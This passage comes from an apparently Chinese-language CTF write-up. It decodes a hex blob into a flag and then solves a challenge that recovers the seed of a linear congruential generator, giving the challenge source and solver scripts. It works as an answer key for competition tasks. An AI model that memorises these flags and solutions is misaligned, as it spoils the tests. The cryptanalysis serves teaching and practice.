80 0C C1 02 32 04 0B C8 10 2C 20</span></span><br><span class="line"><span class="string">43 B0 80 0C C1 02 32 66 47 73 86 56 0F 85 CC 5B</span></span><br><span class="line"><span class="string">3D 93 71 7C E6 63 78 86 F9 9F BF 61 32 66 F2 4D</span></span><br><span class="line"><span class="string">1E 9E 70 72 36 68 83 DF F0 55 1A 72 C3 02 32 04</span></span><br><span class="line"><span class="string">0B C8 10 2C 20 43 B0 80 0C C1 02 32 04 0B C8 10</span></span><br><span class="line"><span class="string">2C 20 43 B0 80 0C C1 02 32 04 0B C8 58 3E 9A 33</span></span><br><span class="line"><span class="string">B4 FA 71 FE FB 07 1A 86 36 CC 9D 4C 1E 60 E8 01</span></span><br><span class="line"><span class="string">93 31 F7 FB 0D 5F 25 37 2C 20 43 B0 80 0C C1 02</span></span><br><span class="line"><span class="string">32 04 0B C8 10 2C 20 43 B0 80 0C C1 02 32 04 0B</span></span><br><span class="line"><span class="string">C8 10 2C 20 43 B0 80 8C F3 A3 39 0F 30 B9 93 66</span></span><br><span class="line"><span class="string">7E F2 66 68 F2 84 C7 97 E2 0C 3D E0 4D E6 1B 6E</span></span><br><span class="line"><span class="string">58 40 86 60 01 19 82 05 64 08 16 90 21 58 40 86</span></span><br><span class="line"><span class="string">60 01 19 82 05 64 08 16 90 21 58 40 86 27 DD 7F</span></span><br><span class="line"><span class="string">C0 E7 87 98 8F 3F 63 FD 23 BF 62 B5 C9 05 0A 1B</span></span><br><span class="line"><span class="string">56 54 58 93 71 03 37 2C 20 43 B0 80 0C C1 02 32</span></span><br><span class="line"><span class="string">04 0B C8 10 2C 20 43 B0 80 0C C1 02 32 04 0B C8</span></span><br><span class="line"><span class="string">10 2C 20 43 B0 80 8C F3 A3 39 F7 4F 8D 3C DE 86</span></span><br><span class="line"><span class="string">C9 9E 1B 96 44 4C 1E E0 7E BF E1 AB E4 86 05 64</span></span><br><span class="line"><span class="string">08 16 90 21 58 40 86 60 01 19 82 05 64 08 16 90</span></span><br><span class="line"><span class="string">21 58 40 86 60 01 19 82 05 64 08 16 90 B1 7C 34</span></span><br><span class="line"><span class="string">E7 01 13 0F 43 9F 5F E3 FD 53 29 F3 8E BF 84 C4</span></span><br><span class="line"><span class="string">74 D1 A4 DF F0 55 1A 72 C3 02 32 04 0B C8 10 2C</span></span><br><span class="line"><span class="string">20 43 B0 80 0C C1 02 32 04 0B C8 10 2C 20 43 B0</span></span><br><span class="line"><span class="string">80 0C C1 02 32 04 0B C8 78 DF 3F F6 51 37 3F 35</span></span><br><span class="line"><span class="string">B2 7A 26 63 C3 01 E6 3F 66 93 F3 4F 93 3F FF 1B</span></span><br><span class="line"><span class="string">BE 4A 1B B8 61 01 19 82 05 64 08 16 90 21 58 40</span></span><br><span class="line"><span class="string">86 60 01 19 82 05 64 08 16 90 21 58 40 86 60 01</span></span><br><span class="line"><span class="string">19 82 05 64 9C 1F CD 99 9C 5C D9 B0 4A 64 72 72</span></span><br><span class="line"><span class="string">E5 F8 3B 3C EF F8 52 9C 6F CE F0 99 13 BE 2E 18</span></span><br><span class="line"><span class="string">6F 9A FF 15 6E 58 40 86 60 01 19 82 05 64 08 16</span></span><br><span class="line"><span class="string">90 21 58 40 86 60 01 19 82 05 64 08 16 90 21 58</span></span><br><span class="line"><span class="string">40 C6 9F D5 BF 60 F5 0A 86 F9 05 0A AB 7F C2 86</span></span><br><span class="line"><span class="string">ED 06 C7 9F 44 3F BE 68 E3 F8 63 E2 1B 7E FE FD</span></span><br><span class="line"><span class="string">7F C4 0D DC B0 80 0C C1 02 32 04 0B C8 10 2C 20</span></span><br><span class="line"><span class="string">43 B0 80 0C C1 02 32 04 0B C8 10 2C 20 43 B0 80</span></span><br><span class="line"><span class="string">0C C1 02 32 66 47 73 E6 E7 15 36 6C 91 98 3C C0</span></span><br><span class="line"><span class="string">EA 89 84 F9 9F BF 7A BC 69 7E B0 E6 F8 EC CE 86</span></span><br><span class="line"><span class="string">BF F2 E4 4F 98 7F 0F 7F 03 37 2C 20 43 B0 80 0C</span></span><br><span class="line"><span class="string">C1 02 32 04 0B C8 10 2C 20 43 B0 80 0C C1 02 32</span></span><br><span class="line"><span class="string">04 0B C8 10 2C 20 43 B0 80 8C F7 EA 79 82 07 AC</span></span><br><span class="line"><span class="string">FA 58 FD 2B 36 AC D5 39 EE F8 7B F8 80 B5 3A 43</span></span><br><span class="line"><span class="string">F7 2F A0 9A E7 86 05 64 08 16 90 21 58 40 86 60</span></span><br><span class="line"><span class="string">01 19 82 05 64 08 16 90 21 58 40 86 60 01 19 82</span></span><br><span class="line"><span class="string">05 64 08 16 90 31 BB 35 67 F5 B2 93 0D 56 2F FE</span></span><br><span class="line"><span class="string">39 BE 14 E7 47 CE 30 E9 01 2F E1 F8 27 F9 FE C5</span></span><br><span class="line"><span class="string">42 1B FE 88 6E 58 40 86 60 01 19 82 05 64 08 16</span></span><br><span class="line"><span class="string">90 21 58 40 86 60 01 19 82 05 64 08 16 90 21 58</span></span><br><span class="line"><span class="string">40 86 60 01 19 B3 A3 39 1B E6 15 8E EF 53 59 3D</span></span><br><span class="line"><span class="string">70 70 7C A1 CB 86 C5 42 43 F7 CF 9D 0C 7D FE 09</span></span><br><span class="line"><span class="string">F7 CF 1E 0D 1D 1F 4E 7A B9 61 01 21 82 05 64 08</span></span><br><span class="line"><span class="string">16 90 21 58 40 86 60 01 19 82 05 64 08 16 90 21</span></span><br><span class="line"><span class="string">58 40 86 60 01 19 EF D5 CF D7 AE 7E C0 77 C3 83</span></span><br><span class="line"><span class="string">EC AB 1D 7F D2 7D E8 86 13 AE FE 9C 0C 1D FF A0</span></span><br><span class="line"><span class="string">AE 76 FF D4 CA CB 0D 0B 08 11 2C 20 43 B0 80 0C</span></span><br><span class="line"><span class="string">C1 02 32 04 0B C8 10 2C 20 43 B0 80 0C C1 02 32</span></span><br><span class="line"><span class="string">04 0B C8 10 2C 20 63 F9 68 CE F8 04 D7 8F 2C 4C</span></span><br><span class="line"><span class="string">BA 61 41 C3 F1 FD 08 AB 27 A8 1E 30 80 65 C8 EC</span></span><br><span class="line"><span class="string">1B 6E 58 40 86 60 01 19 82 05 64 08 16 90 21 58</span></span><br><span class="line"><span class="string">40 86 60 01 19 82 05 64 08 16 90 21 58 40 86 60</span></span><br><span class="line"><span class="string">01 19 7F 4E 1F 60 D6 0D AB 3E 8E 4F 8D DC 7F C2</span></span><br><span class="line"><span class="string">79 AB C7 3E 56 8F 1F DD 30 82 76 7C 42 6B 9E 1B</span></span><br><span class="line"><span class="string">16 90 21 58 40 86 60 01 19 82 05 64 08 16 90 21</span></span><br><span class="line"><span class="string">58 40 86 60 01 19 82 05 64 08 16 90 21 58 40 C6</span></span><br><span class="line"><span class="string">EC D6 9C E3 0B 57 36 2C 23 19 3A 3E F8 B2 FA 8F</span></span><br><span class="line"><span class="string">B8 FA 00 DF 98 7C 93 37 98 7C 1B 6F 78 09 F7 73</span></span><br><span class="line"><span class="string">C3 02 32 04 0B C8 10 2C 20 43 B0 80 0C C1 02 32</span></span><br><span class="line"><span class="string">04 0B C8 10 2C 20 43 B0 80 0C C1 02 32 04 0B C8</span></span><br><span class="line"><span class="string">98 1D CD F9 81 13 2C DE C8 72 C3 EC CE E4 01 86</span></span><br><span class="line"><span class="string">56 4F FF DC F0 1E 3E E0 25 4C 1E 60 E8 FE EF F2</span></span><br><span class="line"><span class="string">FC 09 DD B0 80 0C C1 02 32 04 0B C8 10 2C 20 43</span></span><br><span class="line"><span class="string">B0 80 0C C1 02 32 04 0B C8 10 2C 20 43 B0 80 0C</span></span><br><span class="line"><span class="string">C1 02 32 CE 8F E6 0C 59 46 B2 7A 68 63 F5 74 D4</span></span><br><span class="line"><span class="string">F0 00 1B 1C 9F BC 99 77 7C 76 E7 F8 01 5E 6E 58</span></span><br><span class="line"><span class="string">40 88 60 01 19 82 05 64 08 16 90 21 58 40 86 60</span></span><br><span class="line"><span class="string">01 19 82 05 64 08 16 90 21 58 40 C6 F2 27 DD EF</span></span><br><span class="line"><span class="string">7F C2 F8 F8 09 37 3C 68 FE D9 EA 1D 16 1B 7E C5</span></span><br><span class="line"><span class="string">86 4F D1 E3 B7 60 0C DD 70 42 37 2C 20 43 B0 80</span></span><br><span class="line"><span class="string">0C C1 02 32 04 0B C8 10 2C 20 43 B0 80 0C C1 02</span></span><br><span class="line"><span class="string">32 04 0B C8 10 2C 20 43 B0 80 8C F3 4B 28 6E 78</span></span><br><span class="line"><span class="string">DE 7F A9 1B 5E E0 E7 33 6C 18 CD 19 BA 7F 76 E7</span></span><br><span class="line"><span class="string">FE 03 4C BE 87 89 2F 9A 1B 16 90 21 58 40 86 60</span></span><br><span class="line"><span class="string">01 19 82 05 64 08 16 90 21 58 40 86 60 01 19 82</span></span><br><span class="line"><span class="string">05 64 08 16 90 21 58 40 C6 EC 68 CE EA 71 81 A1</span></span><br><span class="line"><span class="string">1B C6 4A 3E 3B 3E 14 32 3C C3 0D C3 43 AB 1D FF</span></span><br><span class="line"><span class="string">18 CC BB E1 83 F4 99 AD 39 00 FF 08 16 90 21 58</span></span><br><span class="line"><span class="string">40 86 60 01 19 82 05 64 08 16 90 21 58 40 86 60</span></span><br><span class="line"><span class="string">01 19 82 05 64 08 16 90 F1 67 F2 DF CF 4F C6 AC</span></span><br><span class="line"><span class="string">9E 0D 1A 5A FD 12 E6 DF 81 F9 13 1E 1F 4C 79 C0</span></span><br><span class="line"><span class="string">50 C8 EA 9D 34 F3 6F D1 E3 A7 DC 5E 6E 58 40 88</span></span><br><span class="line"><span class="string">60 01 19 82 05 64 08 16 90 21 58 40 86 60 01 19</span></span><br><span class="line"><span class="string">82 05 64 08 16 90 21 58 40 86 60 01 19 B3 A3 39</span></span><br><span class="line"><span class="string">1B 16 AE AC 9E 78 B8 61 E0 60 D2 F1 A1 8A E3 1F</span></span><br><span class="line"><span class="string">83 A1 E3 07 38 3E 79 F3 0C 6E 58 40 86 60 01 19</span></span><br><span class="line"><span class="string">82 05 64 08 16 90 21 58 40 86 60 01 19 82 05 64</span></span><br><span class="line"><span class="string">08 16 90 21 58 40 C6 7B C3 FF BD FF F1 26 9F C5</span></span><br><span class="line"><span class="string">DF 60 F5 B4 C0 F1 47 ED EF 7F 09 1B 3E 06 F7 3F</span></span><br><span class="line"><span class="string">0A 3F FF 26 B8 61 01 19 82 05 64 08 16 90 21 58</span></span><br><span class="line"><span class="string">40 86 60 01 19 82 05 64 08 16 90 21 58 40 86 60</span></span><br><span class="line"><span class="string">01 19 82 05 64 2C 5F 42 F1 00 C3 79 82 CF FF C1</span></span><br><span class="line"><span class="string">FD 0B 1A 86 36 0C BE 0C 7D FE 15 1B 26 6F 56 CF</span></span><br><span class="line"><span class="string">EE 6C 78 0F 27 1D 1F C0 7A B9 61 01 21 82 05 64</span></span><br><span class="line"><span class="string">08 16 90 21 58 40 86 60 01 19 82 05 64 08 16 90</span></span><br><span class="line"><span class="string">21 58 40 86 60 01 19 82 05 64 CC 8E E6 0C 1D 9F</span></span><br><span class="line"><span class="string">27 18 9A 9F 27 58 BD 35 E7 F8 FC D3 F1 B1 95 A1</span></span><br><span class="line"><span class="string">E3 07 98 77 FC 9B 72 FC 00 DF 70 C3 02 32 04 0B</span></span><br><span class="line"><span class="string">C8 10 2C 20 43 B0 80 0C C1 02 32 04 0B C8 10 2C</span></span><br><span class="line"><span class="string">20 43 B0 80 0C C1 02 32 04 0B C8 58 3E 9A 33 74</span></span><br><span class="line"><span class="string">7C 68 E3 7E AB 37 BE DC BF AF 65 68 C3 F0 D0 EA</span></span><br><span class="line"><span class="string">A5 38 1B 3C E0 63 E0 86 05 64 08 16 90 21 58 40</span></span><br><span class="line"><span class="string">86 60 01 19 82 05 64 08 16 90 21 58 40 86 60 01</span></span><br><span class="line"><span class="string">19 82 05 64 08 16 90 71 7E 34 E7 01 56 8F 2C AC</span></span><br><span class="line"><span class="string">9E 99 B8 61 E5 CC E4 4B 58 3D 58 F3 9A 7E 97 6E</span></span><br><span class="line"><span class="string">58 9E 34 79 C2 1B 66 77 DC B0 80 0C C1 02 32 04</span></span><br><span class="line"><span class="string">0B C8 10 2C 20 43 B0 80 0C C1 02 32 04 0B C8 10</span></span><br><span class="line"><span class="string">2C 20 43 B0 80 0C 4F BA FF 80 FB 1F 20 3E BE E9</span></span><br><span class="line"><span class="string">E3 F8 01 86 E6 9F 95 BF 7F C5 C3 EA 13 6E 78 8D</span></span><br><span class="line"><span class="string">6E 58 40 86 60 01 19 82 05 64 08 16 90 21 58 40</span></span><br><span class="line"><span class="string">86 60 01 19 82 05 64 08 16 90 21 58 40 86 60 01</span></span><br><span class="line"><span class="string">19 E7 47 73 36 4C 24 AC 76 FC 25 6C 58 12 31 79</span></span><br><span class="line"><span class="string">80 1B A6 3A CE 3A 3E 79 F3 2A CC 90 0D B9 61 01</span></span><br><span class="line"><span class="string">19 82 05 64 08 16 90 21 58 40 86 60 01 19 82 05</span></span><br><span class="line"><span class="string">64 08 16 90 21 58 40 86 60 01 19 82 05 64 2C 1F</span></span><br><span class="line"><span class="string">CD 39 3E 35 72 DC 86 B1 95 49 1B 26 2A 7E C3 C7</span></span><br><span class="line"><span class="string">60 72 F0 65 83 C9 AD 39 43 B6 E6 00 FC 23 58 40</span></span><br><span class="line"><span class="string">86 60 01 19 82 05 64 08 16 90 21 58 40 86 60 01</span></span><br><span class="line"><span class="string">19 82 05 64 08 16 90 21 58 40 C6 FB 86 89 01 80</span></span><br><span class="line"><span class="string">6F B8 61 01 19 82 05 64 08 16 90 21 58 40 86 60</span></span><br><span class="line"><span class="string">01 19 82 05 64 08 16 90 21 58 40 86 60 01 19 82</span></span><br><span class="line"><span class="string">05 64 08 16 90 21 58 40 86 60 01 19 82 05 64 08</span></span><br><span class="line"><span class="string">16 90 21 58 40 86 60 01 19 82 05 64 08 16 90 21</span></span><br><span class="line"><span class="string">58 40 86 60 01 19 FF 03 A4 B3 15 4F 1E 33 22 26</span></span><br><span class="line"><span class="string">00 00 00 00 49 45 4E 44 AE 42 60 82&quot;&quot;&quot;</span></span><br><span class="line">data = data.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">data_dec = zlib.decompress(<span class="built_in">bytes</span>.fromhex(data))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(data_dec[<span class="number">1</span>:-<span class="number">1</span>].decode()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27; de-415a5253db08&#125;\x0e\xc1\x87\xc2)\xc4\xd4\xa4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;fcc73648-a3dd-457c-8bde-415a5253db08&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="crypto">Crypto</h1>
<h2 id="crypto_randseed">crypto_rand(seed)</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Random.random <span class="keyword">import</span> randrange, getrandbits, choice</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.N = getPrime(<span class="number">256</span>)</span><br><span class="line">        self.a = randrange(self.N)</span><br><span class="line">        self.b = randrange(self.N)</span><br><span class="line">        self.seed = seed % self.N</span><br><span class="line">        self.state = self.seed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.state = (self.a * self.state + self.b) % self.N</span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This is the challenge1,you need solve 50 times&quot;</span>)</span><br><span class="line">    init_seed = getrandbits(<span class="number">256</span>)</span><br><span class="line">    lcg = LCG(init_seed)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a=&quot;</span>+<span class="built_in">str</span>(lcg.a))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;b=&quot;</span>+<span class="built_in">str</span>(lcg.b))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;N=&quot;</span>+<span class="built_in">str</span>(lcg.N))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num1=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    seed1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;seed = &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> seed1 != lcg.seed:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;worry&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This is the challenge2,you need solve 30 times&quot;</span>)</span><br><span class="line">    init_seed = getrandbits(<span class="number">256</span>)</span><br><span class="line">    lcg = LCG(init_seed)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a=&quot;</span>+<span class="built_in">str</span>(lcg.a))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;N=&quot;</span>+<span class="built_in">str</span>(lcg.N))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num1=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num2=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    seed1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;seed = &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> seed1 != lcg.seed:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;worry&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This is the challenge3,you need solve 20 times&quot;</span>)</span><br><span class="line">    init_seed = getrandbits(<span class="number">256</span>)</span><br><span class="line">    lcg = LCG(init_seed)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;N=&quot;</span>+<span class="built_in">str</span>(lcg.N))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num1=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num2=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num3=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    seed1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;seed = &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> seed1 != lcg.seed:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;worry&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This is the challenge4&quot;</span>)</span><br><span class="line">    init_seed = getrandbits(<span class="number">256</span>)</span><br><span class="line">    lcg = LCG(init_seed)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num1=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num2=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num3=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num4=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num5=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num6=&quot;</span>+<span class="built_in">str</span>(lcg.<span class="built_in">next</span>()))</span><br><span class="line">    seed1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;seed = &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> seed1 != lcg.seed:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;worry&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstruct</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;give you code&quot;</span>)</span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&quot;struct&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(fp.read())</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readflag</span>():</span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(fp.read())</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line">readstruct()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    challenge1()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    challenge2()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    challenge3()</span><br><span class="line">challenge4()</span><br><span class="line"></span><br><span class="line">readflag()</span><br></pre></td></tr></table></figure>
<h3 id="challenge1">challenge1</h3>
<p>给定<span class="math inline">\(a, b, N, num1\)</span>。</p>
<p>由于<span class="math inline">\(b&lt;N\)</span>，所以<span
class="math inline">\(num1= a * seed % N + b mod N\)</span>。</p>
<p>逆一下得到<span class="math inline">\(seed = (num1 - b) * invert(a,
N) % N\)</span>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">a = <span class="number">21439995148715855229581313939963482421201576331247112965113607451853558218636</span></span><br><span class="line">b = <span class="number">89759277160476389253551333634559768530087358279888366217118321151632851069307</span></span><br><span class="line">N = <span class="number">94263478176301823003864419448505855238729828567096091430628632016028605616699</span></span><br><span class="line">num1 = <span class="number">93437456039578930967563044293380038273869610383390068845902343882495695897529</span></span><br><span class="line">seed = (num1 - b) * invert(a, N) % N</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br></pre></td></tr></table></figure>
<h3 id="challenge2">challenge2</h3>
<p>给定<span class="math inline">\(a, N, num1,
num2\)</span>，可以把<span
class="math inline">\(b\)</span>消除然后求逆。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">a = <span class="number">16706977725145456108673810243466500040943912361324878692827034267351992747974</span></span><br><span class="line">N = <span class="number">113854020832618498739784394611075999932916312378403736582581526579101900578203</span></span><br><span class="line">num1 = <span class="number">63330820190126996484305779686457877475288865566311745562987677512497606130845</span></span><br><span class="line">num2 = <span class="number">84119406639888798757299912342423831065813108934246920044829949373419237576843</span></span><br><span class="line"><span class="comment"># a*seed%N</span></span><br><span class="line"><span class="comment"># num1 = a * seed % N + b mod N</span></span><br><span class="line"><span class="comment"># num2 = a * num1 % N + b mod N</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (num1 - b) = a * seed mod N</span></span><br><span class="line"><span class="comment"># (num2 - b) = a * num1 mod N</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># num2 - num1 = a * (num1 - seed) mod N</span></span><br><span class="line">seed = (num1 - (num2 - num1) * invert(a, N)) % N</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br></pre></td></tr></table></figure>
<h3 id="challenge3">challenge3</h3>
<p>给定<span class="math inline">\(N, num1, num2,
num3\)</span>，可以先求出<span
class="math inline">\(a\)</span>，然后计算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">N = <span class="number">75077128282729911345908688147049908784831830731419100581244930247044506196477</span></span><br><span class="line">num1 = <span class="number">65940473528726946477803054867754232378739884960304521637067282030349621449921</span></span><br><span class="line">num2 = <span class="number">27044754132512365884748896937170627667054459331766150743556228598626640534200</span></span><br><span class="line">num3 = <span class="number">60958613597574702621084920297199479965887036967057208603596448710717503362927</span></span><br><span class="line"><span class="comment"># num1 = a * seed % N + b mod N</span></span><br><span class="line"><span class="comment"># num2 = a * num1 % N + b mod N</span></span><br><span class="line"><span class="comment"># num3 = a * num2 % N + b mod N</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># num1 - b = a * seed mod N</span></span><br><span class="line"><span class="comment"># num2 - b = a * num1 mod N</span></span><br><span class="line"><span class="comment"># num3 - b = a * num2 mod N</span></span><br><span class="line"><span class="comment"># num2 - num1 = a * (num1 - seed) mod N</span></span><br><span class="line"><span class="comment"># num3 - num2 = a * (num2 - num1) mod N</span></span><br><span class="line">a = (num3 - num2) * invert(num2 - num1, N) % N</span><br><span class="line">seed = (num1 - (num2 - num1) * invert(a, N)) % N</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br></pre></td></tr></table></figure>
<h3 id="challenge4">challenge4</h3>
<p>给了<span class="math inline">\(num1-6\)</span>，没给出<span
class="math inline">\(n\)</span>，推导发现可以可以得到<span
class="math inline">\(t5 * t5 - t6* t4 = (a*a*t4*t4 - a*a*t4*t4) mod N =
0 mod N\)</span>。</p>
<p>然后可以发现这个值是<span
class="math inline">\(N\)</span>的倍数，多来几组就可以求<span
class="math inline">\(gcd\)</span>可能是<span
class="math inline">\(N\)</span>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># state = a * seed % N + b mod N</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, gcd</span><br><span class="line"></span><br><span class="line"><span class="comment"># a=21439995148715855229581313939963482421201576331247112965113607451853558218636</span></span><br><span class="line"><span class="comment"># b=89759277160476389253551333634559768530087358279888366217118321151632851069307</span></span><br><span class="line"><span class="comment"># N=94263478176301823003864419448505855238729828567096091430628632016028605616699</span></span><br><span class="line"><span class="comment"># num1=93437456039578930967563044293380038273869610383390068845902343882495695897529</span></span><br><span class="line"><span class="comment"># seed = (num1 - b) * invert(a, N) % N</span></span><br><span class="line"><span class="comment"># print(seed)</span></span><br><span class="line"><span class="comment"># print(str(seed).encode())</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># a=16706977725145456108673810243466500040943912361324878692827034267351992747974</span></span><br><span class="line"><span class="comment"># N=113854020832618498739784394611075999932916312378403736582581526579101900578203</span></span><br><span class="line"><span class="comment"># num1=63330820190126996484305779686457877475288865566311745562987677512497606130845</span></span><br><span class="line"><span class="comment"># num2=84119406639888798757299912342423831065813108934246920044829949373419237576843</span></span><br><span class="line"><span class="comment"># num1 = a * seed % N + b mod N</span></span><br><span class="line"><span class="comment"># num2 = a * num1 % N + b mod N</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (num1 - b) = a * seed mod N </span></span><br><span class="line"><span class="comment"># (num2 - b) = a * num1 mod N </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># num2 - num1 = a * (num1 - seed) mod N</span></span><br><span class="line"><span class="comment"># seed = (num1 - (num2-num1) * invert(a, N)) % N</span></span><br><span class="line"><span class="comment"># print(seed)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># N=75077128282729911345908688147049908784831830731419100581244930247044506196477</span></span><br><span class="line"><span class="comment"># num1=65940473528726946477803054867754232378739884960304521637067282030349621449921</span></span><br><span class="line"><span class="comment"># num2=27044754132512365884748896937170627667054459331766150743556228598626640534200</span></span><br><span class="line"><span class="comment"># num3=60958613597574702621084920297199479965887036967057208603596448710717503362927</span></span><br><span class="line"><span class="comment"># num1 = a * seed % N + b mod N</span></span><br><span class="line"><span class="comment"># num2 = a * num1 % N + b mod N</span></span><br><span class="line"><span class="comment"># num3 = a * num2 % N + b mod N</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># num1 - b = a * seed mod N</span></span><br><span class="line"><span class="comment"># num2 - b = a * num1 mod N</span></span><br><span class="line"><span 